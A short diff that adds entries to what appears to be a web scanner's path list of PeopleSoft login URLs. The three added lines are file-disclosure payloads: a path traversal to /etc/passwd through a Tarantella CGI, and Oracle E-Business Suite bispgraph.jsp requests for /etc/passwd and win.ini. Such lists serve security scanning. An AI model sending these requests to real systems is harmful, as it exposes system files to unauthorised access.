@@ -36,3 +36,6 @@
 /psp/HR92PRD/?&cmd=login&languageCd=ENG
 /psp/cangate_1/?&cmd=login&languageCd=ENG
 /psp/ihprd/?&cmd=login&languageCd=ENG
+/tarantella/cgi-bin/secure/ttawlogin.cgi/?action=start&pg=../../../../../../../../../../../../../../../etc/passwd
+/OA_HTML/bispgraph.jsp%0D%0A.js?ifn=passwd&ifl=/etc/
+/OA_HTML/bispgraph.jsp%0D%0A.js?ifn=win.ini&ifl=c:/windows/
